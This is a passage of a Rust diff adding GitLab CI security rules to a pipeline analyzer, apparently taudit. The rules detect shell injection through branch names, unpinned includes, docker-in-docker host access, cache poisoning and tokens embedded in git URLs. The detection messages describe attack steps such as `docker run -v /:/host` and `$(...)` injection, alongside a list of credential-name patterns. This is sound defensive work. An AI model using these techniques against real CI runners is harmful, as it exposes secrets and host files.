+                }
+            }
+        }
+
+        if hits.is_empty() {
+            continue;
+        }
+
+        // Dedup hit list while preserving order.
+        let mut seen = std::collections::HashSet::new();
+        let names: Vec<&str> = hits.into_iter().filter(|n| seen.insert(*n)).collect();
+        let mut wh = where_hit;
+        wh.sort();
+        wh.dedup();
+        let where_str = wh.join(" + ");
+        let names_str = names.join(", ");
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::UntrustedCiVarInShellInterpolation,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' interpolates attacker-controlled GitLab predefined variable(s) [{}] into {} without single-quote isolation — a branch / tag / commit message containing `$(...)` executes inside the runner",
+                step.name, names_str, where_str
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Pass the untrusted value through the step's `variables:` / `env:` block (one variable per step), then reference it inside the script as `\"$BRANCH\"` (double-quoted is fine when the value is bound to a real shell variable, not YAML-interpolated). For commands that must include the value, sanitise with `printf %q` or `${VAR//[^A-Za-z0-9_-]/}` first. For `environment:url:`, never interpolate `$CI_COMMIT_*` directly — use a slug-only variable (`$CI_COMMIT_REF_SLUG` is sanitised by GitLab).".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Returns true if `body` contains an *unsafe* expansion of `$VAR` / `${VAR}`
+/// — i.e. one that is NOT enclosed in single quotes and NOT obviously
+/// sanitised. Conservative: errs on the side of flagging because the cost of
+/// a false negative (RCE) dwarfs the cost of a false positive (one extra
+/// review comment).
+fn shell_body_unsafely_expands(body: &str, var: &str) -> bool {
+    // First check that the variable appears at all.
+    let dollar = format!("${var}");
+    let dollar_brace = format!("${{{var}}}");
+    if !body.contains(&dollar) && !body.contains(&dollar_brace) {
+        return false;
+    }
+
+    // Walk lines. A line that's entirely single-quoted around the var is
+    // safe; otherwise we need to be conservative.
+    for line in body.lines() {
+        let line = line.trim_start_matches(['-', ' ', '\t']);
+        if line.is_empty() || line.starts_with('#') {
+            continue;
+        }
+
+        let candidate_positions: Vec<usize> = line
+            .match_indices(&dollar)
+            .map(|(i, _)| i)
+            .chain(line.match_indices(&dollar_brace).map(|(i, _)| i))
+            .collect();
+
+        for pos in candidate_positions {
+            // Reject if the var reference is wrapped in single quotes
+            // (count single-quote occurrences strictly before `pos`; odd
+            // count means we're inside a single-quoted region).
+            let prefix = &line[..pos];
+            let single_count = prefix.matches('\'').count();
+            if single_count % 2 == 1 {
+                continue; // inside '...'
+            }
+            // Reject if line has obvious sanitiser around the var.
+            if line.contains("printf %q")
+                || line.contains("${") && (line.contains("@Q}") || line.contains("//[^"))
+            {
+                // Sanitiser keyword present somewhere — be safe and skip.
+                continue;
+            }
+            return true;
+        }
+    }
+    false
+}
+
+fn url_interpolates_var(url: &str, var: &str) -> bool {
+    let dollar = format!("${var}");
+    let dollar_brace = format!("${{{var}}}");
+    url.contains(&dollar) || url.contains(&dollar_brace)
+}
+
+// ── GitLab CI rules ─────────────────────────────────────
+//
+// Five rules sourced from the v0.9.0 GitLab corpus gap analysis (council
+// review of 277 .gitlab-ci.yml files). Detection inputs come from metadata
+// stamped by `taudit-parse-gitlab` — see `META_GITLAB_*` constants. Each rule
+// is a no-op on graphs from non-GitLab parsers (the markers will simply be
+// absent), so wiring all five into `run_all_rules` is safe.
+
+/// Mutable branch names used as `ref:` on includes — anyone with push to one
+/// of these on the source repo can backdoor every consumer's pipeline.
+const MUTABLE_BRANCH_REFS: &[&str] = &[
+    "main", "master", "develop", "dev", "trunk", "default", "HEAD",
+];
+
+/// Mid-string fragments inside a `remote:` URL that betray a branch ref
+/// (vs a tag or sha). GitLab raw URLs use `/-/raw/<ref>/<path>`.
+fn remote_url_uses_branch(url: &str) -> Option<String> {
+    // Look for `/-/raw/<ref>/` patterns; ref is the segment after `/-/raw/`.
+    let idx = url.find("/-/raw/")?;
+    let after = &url[idx + "/-/raw/".len()..];
+    let ref_seg = after.split('/').next()?;
+    if ref_seg.is_empty() {
+        return None;
+    }
+    // Tags / SHAs aren't mutable: a 40-hex string is a sha; a `v\d+...` or
+    // contains `.` and digits is a tag-ish convention. Branches are everything else.
+    if ref_seg.len() == 40 && ref_seg.chars().all(|c| c.is_ascii_hexdigit()) {
+        return None;
+    }
+    if ref_seg.starts_with('v')
+        && ref_seg
+            .chars()
+            .nth(1)
+            .map(|c| c.is_ascii_digit())
+            .unwrap_or(false)
+    {
+        return None;
+    }
+    Some(ref_seg.to_string())
+}
+
+/// Rule: `unpinned_include_remote_or_branch_ref` (High, Supply Chain).
+///
+/// Top-level GitLab `include:` of a `remote:` URL pinned to a branch, a
+/// `project:` whose `ref:` is a mutable branch (main/master/develop/...), or
+/// an include with no `ref:` at all (defaults to HEAD on the source repo).
+///
+/// Skips `local:` includes (same repo — same trust boundary), `template:`
+/// includes (GitLab-maintained), and `component:` includes that have an `@`
+/// version pin. Reads the structured `META_GITLAB_INCLUDES` blob the parser
+/// stamps on the graph.
+pub fn unpinned_include_remote_or_branch_ref(graph: &AuthorityGraph) -> Vec<Finding> {
+    use taudit_parse_gitlab_include_view::IncludeView;
+
+    let blob = match graph.metadata.get(META_GITLAB_INCLUDES) {
+        Some(s) => s,
+        None => return Vec::new(),
+    };
+    let entries: Vec<IncludeView> = match serde_json::from_str(blob) {
+        Ok(e) => e,
+        Err(_) => return Vec::new(),
+    };
+
+    let mut findings = Vec::new();
+
+    for entry in entries {
+        let kind = entry.kind.as_str();
+        let target = entry.target.as_str();
+        let git_ref = entry.git_ref.as_str();
+
+        match kind {
+            // local / template / component — skip (or handled separately for
+            // unversioned components).
+            "local" | "template" => continue,
+            "component" => {
+                if git_ref.is_empty() {
+                    findings.push(Finding {
+                        severity: Severity::High,
+                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
+                        path: None,
+                        nodes_involved: vec![],
+                        message: format!(
+                            "include: component '{target}' has no version pin (no '@<version>') — owner of the component repo can rewrite every consumer's pipeline silently"
+                        ),
+                        recommendation: Recommendation::PinAction {
+                            current: target.to_string(),
+                            pinned: format!("{target}@<sha-or-tag>"),
+                        },
+                        source: FindingSource::BuiltIn,
+                        extras: FindingExtras::default(),
+                    });
+                }
+            }
+            "remote" => {
+                if let Some(branch) = remote_url_uses_branch(target) {
+                    findings.push(Finding {
+                        severity: Severity::High,
+                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
+                        path: None,
+                        nodes_involved: vec![],
+                        message: format!(
+                            "include: remote URL pins branch '{branch}' ({target}) — included YAML executes with consumer's CI_JOB_TOKEN and secrets; whoever controls that branch can backdoor this pipeline"
+                        ),
+                        recommendation: Recommendation::PinAction {
+                            current: target.to_string(),
+                            pinned: target.replacen(
+                                &format!("/-/raw/{branch}/"),
+                                "/-/raw/<full-sha>/",
+                                1,
+                            ),
+                        },
+                        source: FindingSource::BuiltIn,
+                        extras: FindingExtras::default(),
+                    });
+                }
+            }
+            "project" => {
+                let lower = git_ref.to_ascii_lowercase();
+                let is_branch = MUTABLE_BRANCH_REFS
+                    .iter()
+                    .any(|b| b.eq_ignore_ascii_case(&lower));
+                let missing = git_ref.is_empty();
+                let is_sha = git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit());
+                if (missing || is_branch) && !is_sha {
+                    let why = if missing {
+                        "no `ref:` (defaults to HEAD on source project)".to_string()
+                    } else {
+                        format!("`ref: {git_ref}` is a mutable branch")
+                    };
+                    findings.push(Finding {
+                        severity: Severity::High,
+                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
+                        path: None,
+                        nodes_involved: vec![],
+                        message: format!(
+                            "include: project '{target}' — {why}; included YAML can redefine every job's `script:` and runs with consumer's secrets"
+                        ),
+                        recommendation: Recommendation::PinAction {
+                            current: format!(
+                                "project: {target}{}",
+                                if missing {
+                                    String::new()
+                                } else {
+                                    format!(", ref: {git_ref}")
+                                }
+                            ),
+                            pinned: format!("project: {target}, ref: <full-commit-sha>"),
+                        },
+                        source: FindingSource::BuiltIn,
+                        extras: FindingExtras::default(),
+                    });
+                }
+            }
+            _ => {}
+        }
+    }
+
+    findings
+}
+
+/// Rule: `dind_service_grants_host_authority` (High, Privilege).
+///
+/// A GitLab job that declares a `services: [docker:*-dind]` sidecar AND
+/// holds at least one secret (other than the implicit, structurally-present
+/// CI_JOB_TOKEN). The dind sidecar exposes the full Docker socket inside
+/// the job container, so a malicious build step can `docker run -v /:/host`
+/// and read the runner host filesystem.
+pub fn dind_service_grants_host_authority(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let has_dind = step
+            .metadata
+            .get(META_GITLAB_DIND_SERVICE)
+            .map(|v| v == "true")
+            .unwrap_or(false);
+        if !has_dind {
+            continue;
+        }
+
+        // Walk this step's HasAccessTo edges for secrets / non-implicit
+        // identities. The implicit CI_JOB_TOKEN does not count — every job
+        // has it by platform design, so flagging on it would emit noise on
+        // every dind job.
+        let mut sensitive: Vec<String> = Vec::new();
+        for edge in graph.edges_from(step.id) {
+            if edge.kind != EdgeKind::HasAccessTo {
+                continue;
+            }
+            let target = match graph.node(edge.to) {
+                Some(n) => n,
+                None => continue,
+            };
+            let is_implicit = target
+                .metadata
+                .get(META_IMPLICIT)
+                .map(|v| v == "true")
+                .unwrap_or(false);
+            if is_implicit {
+                continue;
+            }
+            match target.kind {
+                NodeKind::Secret => sensitive.push(target.name.clone()),
+                NodeKind::Identity => sensitive.push(target.name.clone()),
+                _ => {}
+            }
+        }
+
+        if sensitive.is_empty() {
+            continue;
+        }
+
+        sensitive.sort();
+        sensitive.dedup();
+        // Cap the message length — corpora include jobs with dozens of vars.
+        let preview = if sensitive.len() > 4 {
+            format!(
+                "{} (and {} more)",
+                sensitive[..4].join(", "),
+                sensitive.len() - 4
+            )
+        } else {
+            sensitive.join(", ")
+        };
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::DindServiceGrantsHostAuthority,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' uses a docker:dind service AND holds secrets [{}] — a malicious build step can `docker run -v /:/host` from inside dind and exfiltrate the runner's filesystem (other jobs' artifacts, cached creds)",
+                step.name, preview
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Replace docker-in-docker with kaniko / buildah / img for image builds (no privileged sidecar required), OR isolate the dind job to a dedicated runner pool with no shared workspace and no other secrets in scope.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Substrings (case-insensitive) that identify a GitLab security scanner job
+/// either by job name or by an `extends:` template name.
+const SCANNER_PATTERNS: &[&str] = &[
+    "sast",
+    "dast",
+    "secret_detection",
+    "secret-detection",
+    "dependency_scanning",
+    "dependency-scanning",
+    "container_scanning",
+    "container-scanning",
+    "gitleaks",
+    "trivy",
+    "grype",
+    "semgrep",
+    "bandit",
+    "snyk",
+    "license_scanning",
+    "license-scanning",
+    "iac_scan",
+    "iac-scan",
+    "fuzz",
+    "api_fuzzing",
+    "api-fuzzing",
+    "coverage_fuzzing",
+    "coverage-fuzzing",
+];
+
+fn step_matches_scanner(step_name: &str, extends: Option<&String>) -> bool {
+    let lower = step_name.to_ascii_lowercase();
+    if SCANNER_PATTERNS.iter().any(|p| lower.contains(p)) {
+        return true;
+    }
+    if let Some(ext) = extends {
+        let elower = ext.to_ascii_lowercase();
+        if SCANNER_PATTERNS.iter().any(|p| elower.contains(p)) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Rule: `security_job_silently_skipped` (Medium, Configuration).
+///
+/// A security-scanner job (matched by name or `extends:` template) runs with
+/// `allow_failure: true` and no `rules:` clause that surfaces the failure.
+/// The pipeline goes green even when the scan errors out — silent-pass is
+/// worse than no scan because reviewers trust the badge.
+///
+/// We can't statically prove the absence of a "surface failures" rule from
+/// YAML alone, so we fire whenever `allow_failure: true` is set on a scanner
+/// job and let the operator confirm. The recommendation guides them to the
+/// fix.
+pub fn security_job_silently_skipped(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let allow_failure = step
+            .metadata
+            .get(META_GITLAB_ALLOW_FAILURE)
+            .map(|v| v == "true")
+            .unwrap_or(false);
+        if !allow_failure {
+            continue;
+        }
+
+        let extends = step.metadata.get(META_GITLAB_EXTENDS);
+        if !step_matches_scanner(&step.name, extends) {
+            continue;
+        }
+
+        let how = match extends {
+            Some(e) => format!("matched by extends: {e}"),
+            None => "matched by job name".to_string(),
+        };
+
+        findings.push(Finding {
+            severity: Severity::Medium,
+            category: FindingCategory::SecurityJobSilentlySkipped,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Security-scanner job '{}' ({how}) runs with allow_failure: true — when the scan errors out the pipeline still goes green; reviewers trust a badge that is no longer evidence",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Either drop `allow_failure: true` and let the scanner gate the pipeline, OR add a follow-up `rules:` clause that surfaces the failure (e.g. a stage that asserts the scan report exists and is non-empty). A scanner that fails closed is worth more than a scanner that fails silently.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Rule: `child_pipeline_trigger_inherits_authority` (Medium, Propagation).
+///
+/// A GitLab `trigger:` job (downstream / child pipeline) either runs in
+/// `merge_request_event` context OR is a *dynamic* child pipeline whose
+/// included YAML comes from a previous job's `artifact:`. Both shapes mean
+/// untrusted input shapes the pipeline that runs with the parent project's
+/// CI_JOB_TOKEN and secrets.
+pub fn child_pipeline_trigger_inherits_authority(graph: &AuthorityGraph) -> Vec<Finding> {
+    let graph_is_mr = graph
+        .metadata
+        .get(META_TRIGGER)
+        .map(|v| v == "merge_request")
+        .unwrap_or(false);
+
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let kind = match step.metadata.get(META_GITLAB_TRIGGER_KIND) {
+            Some(k) => k.as_str(),
+            None => continue,
+        };
+
+        let is_dynamic = kind == "dynamic";
+        let is_mr = graph_is_mr;
+
+        if !is_dynamic && !is_mr {
+            continue;
+        }
+
+        let mut reasons: Vec<&str> = Vec::new();
+        if is_dynamic {
+            reasons.push("includes child YAML from a previous job's artifact (dynamic child pipeline — code-injection sink)");
+        }
+        if is_mr {
+            reasons.push(
+                "runs in merge_request_event context — fork code shapes the downstream pipeline",
+            );
+        }
+        let why = reasons.join(" AND ");
+
+        findings.push(Finding {
+            severity: Severity::Medium,
+            category: FindingCategory::ChildPipelineTriggerInheritsAuthority,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Trigger job '{}' {why}; the downstream pipeline inherits the parent project's CI_JOB_TOKEN and any reachable secrets",
+                step.name
+            ),
+            recommendation: Recommendation::Manual {
+                action: "For dynamic child pipelines: validate the generated YAML against a schema before triggering, or pre-stage all child pipeline files in-tree and use `include:` (static) instead of `include: artifact:`. For MR-triggered triggers: gate the downstream with `rules: if: $CI_PIPELINE_SOURCE != 'merge_request_event'` so fork PRs cannot reach it.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Heuristic: cache keys that cross trust boundaries. Returns `Some(reason)`
+/// when the key is one of the dangerous shapes, `None` when the key is
+/// scoped tightly enough.
+fn unsafe_cache_key(key: &str) -> Option<&'static str> {
+    let trimmed = key.trim();
+    if trimmed.is_empty() {
+        // GitLab default key when none is set: `default` — same blast radius as hardcoded.
+        return Some("absent (defaults to a single shared 'default' key per runner)");
+    }
+    // CI_JOB_NAME alone — same name across MR + main = shared key.
+    if trimmed == "$CI_JOB_NAME"
+        || trimmed == "${CI_JOB_NAME}"
+        || trimmed.eq_ignore_ascii_case("$ci_job_name")
+    {
+        return Some(
+            "`$CI_JOB_NAME` only — same name on MR and default-branch jobs share the cache",
+        );
+    }
+    // CI_COMMIT_REF_SLUG alone — handled by caller (depends on policy).
+    // Otherwise: any key without a $-interpolation is hardcoded → shared.
+    if !trimmed.contains('$') {
+        return Some("hardcoded — every job and every branch share the same cache");
+    }
+    None
+}
+
+/// Rule: `cache_key_crosses_trust_boundary` (Medium, Supply Chain).
+///
+/// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
+/// only, or `$CI_COMMIT_REF_SLUG` *without* a `policy: pull` restriction.
+/// Caches are stored per-runner keyed by `key:` — a poisoned MR can push a
+/// malicious `node_modules/` cache that the next default-branch job
+/// downloads and executes.
+pub fn cache_key_crosses_trust_boundary(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let key = match step.metadata.get(META_GITLAB_CACHE_KEY) {
+            Some(k) => k,
+            None => continue,
+        };
+        let policy = step
+            .metadata
+            .get(META_GITLAB_CACHE_POLICY)
+            .map(|s| s.as_str())
+            .unwrap_or("pull-push"); // GitLab's runtime default
+
+        // pull-only consumers cannot poison the cache — skip those
+        let is_pull_only = matches!(policy, "pull");
+
+        let trimmed = key.trim();
+
+        // Per-ref key: $CI_COMMIT_REF_SLUG. Safe ONLY when the consuming jobs
+        // restrict themselves to `policy: pull`. Without that restriction, an
+        // MR job pushes a cache the next protected-branch job downloads
+        // (refs are *namespaced* but not *isolated* — the same key on `main`
+        // shadows over time and the runner's per-key store is shared).
+        let is_ref_slug = trimmed == "$CI_COMMIT_REF_SLUG"
+            || trimmed == "${CI_COMMIT_REF_SLUG}"
+            || trimmed.eq_ignore_ascii_case("$ci_commit_ref_slug");
+        if is_ref_slug {
+            if !is_pull_only {
+                findings.push(Finding {
+                    severity: Severity::Medium,
+                    category: FindingCategory::CacheKeyCrossesTrustBoundary,
+                    path: None,
+                    nodes_involved: vec![step.id],
+                    message: format!(
+                        "Step '{}' uses cache key `$CI_COMMIT_REF_SLUG` with policy `{policy}` — MR jobs can push poisoned caches that subsequent default-branch jobs restore (npm install / Maven plugin resolution executes cached artifacts)",
+                        step.name
+                    ),
+                    recommendation: Recommendation::Manual {
+                        action: "Set `policy: pull` on jobs that consume the cache from a different trust context (default-branch, protected refs), and restrict `policy: push` to a dedicated job that runs only on protected branches. Combine with `key: { files: [package-lock.json] }` so cache reuse requires identical input hashes.".into(),
+                    },
+                    source: FindingSource::BuiltIn,
+                    extras: FindingExtras::default(),
+                });
+            }
+            continue;
+        }
+
+        if let Some(reason) = unsafe_cache_key(key) {
+            findings.push(Finding {
+                severity: Severity::Medium,
+                category: FindingCategory::CacheKeyCrossesTrustBoundary,
+                path: None,
+                nodes_involved: vec![step.id],
+                message: format!(
+                    "Step '{}' has cache key `{key}` ({reason}) with policy `{policy}` — caches cross trust boundaries; an MR or fork can stage a poisoned cache that the next protected-branch job restores and executes",
+                    step.name
+                ),
+                recommendation: Recommendation::Manual {
+                    action: "Scope the cache key to inputs only an authorized run can produce, e.g. `key: { files: [package-lock.json] }` so the key changes when dependencies change, and combine with `policy: pull` on consumers in higher trust contexts.".into(),
+                },
+                source: FindingSource::BuiltIn,
+                extras: FindingExtras::default(),
+            });
+        }
+    }
+
+    findings
+}
+
+/// Local view-struct mirroring `taudit_parse_gitlab::IncludeEntry` — kept here
+/// so taudit-core does not depend on taudit-parse-gitlab. The two crates pass
+/// data only through the JSON blob in `META_GITLAB_INCLUDES`.
+mod taudit_parse_gitlab_include_view {
+    use serde::Deserialize;
+    #[derive(Debug, Clone, Deserialize)]
+    pub struct IncludeView {
+        pub kind: String,
+        pub target: String,
+        pub git_ref: String,
+    }
+}
+
+/// Rule: a CI script body constructs an HTTPS git URL with credentials
+/// embedded directly in the URL (`https://user:$TOKEN@host/...`) and
+/// invokes git against it (`git clone`, `git push`, `git remote set-url`,
+/// `git fetch`, `git ls-remote`).
+///
+/// Detection: scan `META_SCRIPT_BODY` for the regex equivalent
+/// `https://[^/\s'"]*:\$\{?[A-Z0-9_]*(TOKEN|PAT|PASSWORD|PASSWD|KEY|SECRET)[A-Z0-9_]*\}?@`
+/// implemented byte-by-byte to keep the dependency surface minimal.
+///
+/// Severity: **High**. Embedded credentials persist in `.git/config`,
+/// are visible to every subsequent process via `ps`/`/proc/*/cmdline`,
+/// land in `GIT_TRACE` output when set, and may be uploaded as part of
+/// any artifact that bundles the workspace.
+pub fn pat_embedded_in_git_remote_url(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let body = match step.metadata.get(META_SCRIPT_BODY) {
+            Some(b) if !b.trim().is_empty() => b,
+            _ => continue,
+        };
+
+        let hits = find_credential_embedded_git_urls(body);
+        if hits.is_empty() {
+            continue;
+        }
+
+        // Cap message previews so we don't spam logs with huge URLs.
+        let preview: String = hits
+            .iter()
+            .take(2)
+            .map(|s| s.as_str())
+            .collect::<Vec<_>>()
+            .join(", ");
+        let suffix = if hits.len() > 2 {
+            format!(", and {} more", hits.len() - 2)
+        } else {
+            String::new()
+        };
+
+        findings.push(Finding {
+            severity: Severity::High,
+            category: FindingCategory::PatEmbeddedInGitRemoteUrl,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' embeds a credential variable directly in a git remote URL ({}{}). The token value is exposed in process argv (visible to `ps`), persists in .git/config for the rest of the job, and is captured by GIT_TRACE if enabled.",
+                step.name, preview, suffix
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Use a credential helper or env-var-based authentication instead of inlining the token in the URL. For GitLab CI, prefer `git -c http.extraHeader=\"PRIVATE-TOKEN: $PAT_TOKEN\" push <url>`, or set `CI_JOB_TOKEN` as the credential helper. Never construct `https://user:$TOKEN@host/...` URLs.".into(),
+            },
+            source: FindingSource::BuiltIn,
+            extras: FindingExtras::default(),
+        });
+    }
+
+    findings
+}
+
+/// Find substrings in `body` that look like
+/// `https://<userpart>:<token-var-ref>@host`. Returns up to 8 unique hits
+/// (stable order). The token variable is required to look like a credential
+/// name (TOKEN/PAT/PASSWORD/PASSWD/KEY/SECRET) — bare `$VAR` references
+/// without a credential-shaped name don't fire to keep the false-positive
+/// rate down.
+fn find_credential_embedded_git_urls(body: &str) -> Vec<String> {
+    let mut hits: Vec<String> = Vec::new();
+    let bytes = body.as_bytes();
+    let mut i = 0usize;
+    let needle = b"https://";
+
+    while i + needle.len() <= bytes.len() {
+        if &bytes[i..i + needle.len()] != needle {
+            i += 1;
+            continue;
+        }
+        // Find the end of the URL "authority" component — terminator is the
+        // next `/`, whitespace, quote, or end-of-string.
+        let mut end = i + needle.len();
+        while end < bytes.len() {
+            let c = bytes[end];
+            if c == b'/'
+                || c == b' '
+                || c == b'\t'
+                || c == b'\n'
+                || c == b'\r'
+                || c == b'"'
+                || c == b'\''
+                || c == b'`'
+            {
+                break;
+            }
+            end += 1;
+        }
+        let authority = &body[i + needle.len()..end];
+
+        if url_authority_has_embedded_credential_var(authority) {
+            // Capture the full URL up to the path delimiter for the message.
+            let urlend = end;
+            let url = &body[i..urlend];
+            let url_short = if url.len() > 120 {
+                format!("{}…", &url[..120])
+            } else {
+                url.to_string()
+            };
+            if !hits.contains(&url_short) {
+                hits.push(url_short);
+                if hits.len() == 8 {
+                    break;
+                }
+            }
+        }
+
+        i = end.max(i + 1);
+    }
+
+    hits
+}
+
+/// Decide whether a URL's authority component (everything after `https://`
+/// and before the path) contains a credential-shaped variable reference of
+/// the form `user:$TOKEN_NAME@host` or `user:${TOKEN_NAME}@host`.
+fn url_authority_has_embedded_credential_var(authority: &str) -> bool {
+    // Must contain both ':' and '@' with ':' before '@'.
+    let at = match authority.find('@') {
+        Some(p) => p,
+        None => return false,
+    };
+    let userinfo = &authority[..at];
+    let colon = match userinfo.find(':') {
+        Some(p) => p,
+        None => return false,
+    };
+    let pw_part = &userinfo[colon + 1..];
+    if pw_part.is_empty() {
+        return false;
+    }
+    // Strip optional `${...}` braces so we can inspect the variable name.
+    let pw_inner = pw_part.trim_start_matches('$');
+    let pw_inner = pw_inner.trim_start_matches('{').trim_end_matches('}');
+    // Variable name must look like an env var (uppercase, digits, underscores)
+    // and contain a credential-shaped fragment.
+    if pw_inner.is_empty() {
+        return false;
+    }
+    let looks_like_var = pw_inner
+        .chars()
+        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
+    if !looks_like_var {
+        return false;
+    }
+    const CRED_FRAGMENTS: &[&str] = &[
+        "TOKEN", "PAT", "PASSWORD", "PASSWD", "KEY", "SECRET", "CRED",
+    ];
+    CRED_FRAGMENTS.iter().any(|frag| pw_inner.contains(frag))
+}
+
+/// Rule: a CI script triggers a different project's pipeline via the GitLab
+/// REST API using `CI_JOB_TOKEN` and forwards variables via the
+/// `variables[KEY]=value` query/form parameter. Cross-project authority
+/// bridge — the downstream project's security depends on the trust contract
+/// between the two projects, and variable values flowing across that
+/// boundary may originate from MR/fork context the attacker controls.
+///
+/// Severity: **Medium**. Higher-risk when the triggering job runs on MR
+/// pipelines (`META_TRIGGER == "merge_request"`) — the message annotates
+/// that case explicitly so operators see the elevated risk.
+pub fn ci_token_triggers_downstream_with_variable_passthrough(
+    graph: &AuthorityGraph,
+) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let pipeline_is_mr_triggered = graph
+        .metadata
+        .get(META_TRIGGER)
+        .map(|t| t == "merge_request")
+        .unwrap_or(false);
+
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        let body = match step.metadata.get(META_SCRIPT_BODY) {
+            Some(b) if !b.trim().is_empty() => b,
+            _ => continue,
+        };
+
+        if !script_triggers_downstream_with_passthrough(body) {
+            continue;
+        }
+
+        let suffix = if pipeline_is_mr_triggered {
+            " (pipeline triggered on merge_request — variable values may originate from attacker-controlled MR context)"
+        } else {
+            ""
+        };
+
+        findings.push(Finding {
+            severity: Severity::Medium,
+            category: FindingCategory::CiTokenTriggersDownstreamWithVariablePassthrough,
+            path: None,
+            nodes_involved: vec![step.id],
+            message: format!(
+                "Step '{}' triggers a downstream pipeline via the GitLab REST API using CI_JOB_TOKEN and forwards variables[…] in the request — this is a cross-project authority channel that bypasses the parent-child trust model{}",
+                step.name, suffix
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Constrain which variables the downstream pipeline accepts (use `variables.X.expand: false` and explicit allowlists), prefer pipeline triggers via `trigger:` keyword with `strategy: depend` over `curl … CI_JOB_TOKEN …`, and audit the receiving project's CI/CD settings to ensure it does not honour caller-supplied variables on protected refs.".into(),
+            },
+            source: FindingSource::BuiltIn,
                 extras: FindingExtras::default(),
 });
     }
 
     findings
+}
+
+/// Returns true if `body` contains a `curl` (or wget) call that hits a
+/// GitLab `/trigger/pipeline` endpoint with both `CI_JOB_TOKEN` and a
+/// `variables[…]` field. We accept either query-string form
+/// (`variables[X]=...`) or form-data form (`-F "variables[X]=..."`).
+fn script_triggers_downstream_with_passthrough(body: &str) -> bool {
+    let lower = body.to_lowercase();
+    // Match a triggering call: must mention `trigger/pipeline` and reference
+    // CI_JOB_TOKEN, plus carry a `variables[` token.
+    let trigger_endpoint = lower.contains("trigger/pipeline")
+        || lower.contains("/api/v4/projects/") && lower.contains("/trigger");
+    if !trigger_endpoint {
+        return false;
+    }
+    let has_token = lower.contains("ci_job_token");
+    if !has_token {
+        return false;
+    }
+    body.contains("variables[")
+}
+
+/// Rule: a job emits an `artifacts.reports.dotenv: <file>` artifact whose
+/// contents become pipeline variables for any consumer linked via `needs:`
+/// or `dependencies:`. A consumer in a later stage that targets a
+/// production-named environment inherits those variables transparently.
+/// Producer-side risk amplifies when the script reads attacker-influenced
+/// inputs (`CI_COMMIT_REF_NAME`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`,
+/// `CI_COMMIT_TAG`, branch/commit derived strings).
+///
+/// Severity: **High** when a producer→consumer chain exists with a
+/// production-like environment on the consumer; **Medium** when the chain
+/// exists but no production environment is detected (still a covert
+/// variable-promotion channel).
+pub fn dotenv_artifact_flows_to_privileged_deployment(graph: &AuthorityGraph) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    // Build (producer name -> producer step id, dotenv file) index.
+    let mut producers: std::collections::HashMap<String, (NodeId, String)> =
+        std::collections::HashMap::new();
+    for step in graph.nodes_of_kind(NodeKind::Step) {
+        if let Some(file) = step.metadata.get(META_DOTENV_FILE) {
+            if let Some(job) = step.metadata.get(META_JOB_NAME) {
+                producers.insert(job.clone(), (step.id, file.clone()));
+            }
+        }
+    }
+    if producers.is_empty() {
+        return findings;
+    }
+
+    for consumer in graph.nodes_of_kind(NodeKind::Step) {
+        let needs_csv = match consumer.metadata.get(META_NEEDS) {
+            Some(s) if !s.is_empty() => s,
+            _ => continue,
+        };
+        let upstream_jobs: Vec<&str> = needs_csv.split(',').filter(|s| !s.is_empty()).collect();
+        let matched: Vec<&(NodeId, String)> = upstream_jobs
+            .iter()
+            .filter_map(|j| producers.get(*j))
+            .collect();
+        if matched.is_empty() {
+            continue;
+        }
+
+        let env_name = consumer
+            .metadata
+            .get(META_ENVIRONMENT_NAME)
+            .map(String::as_str)
+            .unwrap_or("");
+        // Production-like signal: explicit `environment.name:` value, OR
+        // (fallback) the job name itself encodes a production marker.
+        // GitLab pipelines often skip the explicit `environment:` block
+        // and rely on stage/job naming conventions like `deploy-prod`.
+        let consumer_job = consumer
+            .metadata
+            .get(META_JOB_NAME)
+            .map(String::as_str)
+            .unwrap_or(consumer.name.as_str());
+        let production_like =
+            is_production_environment(env_name) || is_production_environment(consumer_job);
+
+        // Decide elevation: production-like consumer environment OR
+        // producer script ingests attacker-influenced CI variables.
